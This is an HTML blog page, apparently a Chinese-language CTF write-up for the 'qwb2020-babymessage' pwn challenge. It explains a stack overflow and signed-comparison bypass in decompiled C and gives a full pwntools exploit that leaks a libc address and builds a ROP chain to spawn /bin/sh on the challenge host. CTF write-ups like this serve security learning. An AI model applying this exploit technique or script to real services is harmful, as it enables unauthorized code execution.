@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="stack overflow 发现漏洞点 123456789101112__int64 __fastcall leave_message(unsigned int a1)&amp;#123;  int v1; // ST14_4@1  __int64 v3; // [sp+18h] [bp-8h]@1   puts(&quot;message: &quot;);  v1 = read(0, &amp;amp;v3, a1);//可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="qwb2020-babymessage">
+<meta property="og:url" content="http://yoursite.com/2020/04/07/CTF/pwn/qwb2020-babymessage/index.html">
+<meta property="og:site_name" content="My blog">
+<meta property="og:description" content="stack overflow 发现漏洞点 123456789101112__int64 __fastcall leave_message(unsigned int a1)&amp;#123;  int v1; // ST14_4@1  __int64 v3; // [sp+18h] [bp-8h]@1   puts(&quot;message: &quot;);  v1 = read(0, &amp;amp;v3, a1);//可以">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-02-17T10:36:29.025Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="qwb2020-babymessage">
+<meta name="twitter:description" content="stack overflow 发现漏洞点 123456789101112__int64 __fastcall leave_message(unsigned int a1)&amp;#123;  int v1; // ST14_4@1  __int64 v3; // [sp+18h] [bp-8h]@1   puts(&quot;message: &quot;);  v1 = read(0, &amp;amp;v3, a1);//可以">
+
+<link rel="canonical" href="http://yoursite.com/2020/04/07/CTF/pwn/qwb2020-babymessage/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>qwb2020-babymessage | My blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">My blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/07/CTF/pwn/qwb2020-babymessage/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xxx">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          qwb2020-babymessage
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-07 23:13:21" itemprop="dateCreated datePublished" datetime="2020-04-07T23:13:21+08:00">2020-04-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-17 18:36:29" itemprop="dateModified" datetime="2021-02-17T18:36:29+08:00">2021-02-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h1><ol>
+<li><p>发现漏洞点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">leave_message</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST14_4@1</span></span><br><span class="line">  __int64 v3; <span class="comment">// [sp+18h] [bp-8h]@1</span></span><br><span class="line"> </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"message: "</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, &amp;v3, a1);<span class="comment">//可以覆盖到rbp</span></span><br><span class="line">  <span class="built_in">strncpy</span>(buf, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, v1);</span><br><span class="line">  buf[v1] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"done!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第一次循环，v1一开始是 16，但 leave_message 中 v3 的长度是 8，造成栈溢出，可以覆盖旧的 rbp，从而在函数返回时伪造 rbp 为任意值。</p>
+</li>
+<li><p>返回后进入第二次循环，因为在 v1 和 256 比较大小时以 rbp 为基准寻址，加上有符号比较存在整数溢出漏洞，所以可以伪造 rbp 使得 rbp-4 处的值是一个负数，从而绕过大小检查，在 leave_message 中 read 时读入超长字符串，控制返回地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">work</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"> </span><br><span class="line">  buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  v1 = mm + <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"choice: "</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;mm);</span><br><span class="line">          <span class="keyword">if</span> ( mm != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          leave_name();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( mm != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &gt; <span class="number">256</span> ) <span class="comment">//v1是从rbp-4处取值</span></span><br><span class="line">          v1 = <span class="number">256</span>;</span><br><span class="line">        leave_message(v1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( mm != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( mm == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>覆盖a1为0x6010d4，使read能读取更多的输入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#p = process(["ld-2.23.so","./babymessage"],env=&#123;"LD_PRELOAD":"./libc6_2.23-0ubuntu11.2_amd64.so"&#125;)</span></span><br><span class="line">p = remote(<span class="string">'10.10.31.156'</span>,<span class="number">10005</span>)</span><br><span class="line">elf = ELF(<span class="string">"./babymessage"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc6_2.23-0ubuntu11.2_amd64.so"</span>)</span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vfunc_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"work addr:"</span> + str(hex(vfunc_addr)))</span><br><span class="line"> </span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">read_offset = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#binsh_offset = 0x1b40fa</span></span><br><span class="line">binsh_offset = next(libc.search(<span class="string">b'/bin/sh'</span>))</span><br><span class="line">pop_rdi = <span class="number">0x400ac3</span></span><br><span class="line">payload1 = <span class="string">b'aaaabaaa'</span>+p64(<span class="number">0x6010d4</span>) <span class="comment">#覆盖rbp为0x6010d4使下一次read可以覆盖更多栈空间</span></span><br><span class="line">payload2 = <span class="string">b'a'</span>*<span class="number">16</span> + p64(<span class="number">0x400ac3</span>)  + p64(read_got) + p64(puts_addr) + p64(<span class="number">0x4009dd</span>) <span class="comment">#泄露read_got地址，返回main</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p,gdbscript='''b *0x40083B''')</span></span><br><span class="line"><span class="comment">#gdb.attach(p,gdbscript='''b *0x400887''')</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">"choice: \n"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"name: \n"</span>,<span class="string">"5"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"choice: \n"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"message: \n"</span>,payload1)</span><br><span class="line">print(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">"choice: \n"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"message: \n"</span>,payload2)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">read_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">read_addr = u64(read_addr.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"read_addr = %#x"</span>, read_addr)</span><br><span class="line"> </span><br><span class="line">system_addr = read_addr - read_offset + system_offset</span><br><span class="line">binsh_addr = read_addr - read_offset + binsh_offset</span><br><span class="line">log.info(<span class="string">"system_addr = %#x"</span>, system_addr)</span><br><span class="line">log.info(<span class="string">"binsh_addr = %#x"</span>, binsh_addr)</span><br><span class="line">payload3 = <span class="string">b'aaaabaaa'</span>+p64(<span class="number">0x6010d4</span>)+p64(<span class="number">0x40099f</span>) <span class="comment">#gdb跟到这里发现read的size再次被修改回去了，因此我们再覆盖一次read的size，并返回main函数</span></span><br><span class="line">payload5 = <span class="string">b'a'</span>*<span class="number">16</span> + p64(<span class="number">0x400ac4</span>) + p64(<span class="number">0x400ac3</span>)  + p64(binsh_addr) + p64(system_addr) + p64(<span class="number">0x4009dd</span>) <span class="comment">#构造rop链，执行system（"/bin/sh"）,但是调试发现call system时rsp没有对齐，会导致crash，所以需要县ret一次再pop rdi ;ret</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">"choice: \n"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"name: \n"</span>,<span class="string">"5"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"choice: \n"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"message: \n"</span>,payload3)</span><br><span class="line">p.sendlineafter(<span class="string">"choice: \n"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"message: \n"</span>,payload5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/07/CTF/pwn/2014hitcon-stkof/" rel="prev" title="2014hitcon-stkof">
+      <i class="fa fa-chevron-left"></i> 2014hitcon-stkof
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/07/CTF/pwn/greeting-150/" rel="next" title="greeting-150">
+      greeting-150 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-overflow"><span class="nav-number">1.</span> <span class="nav-text">stack overflow</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xxx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xxx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
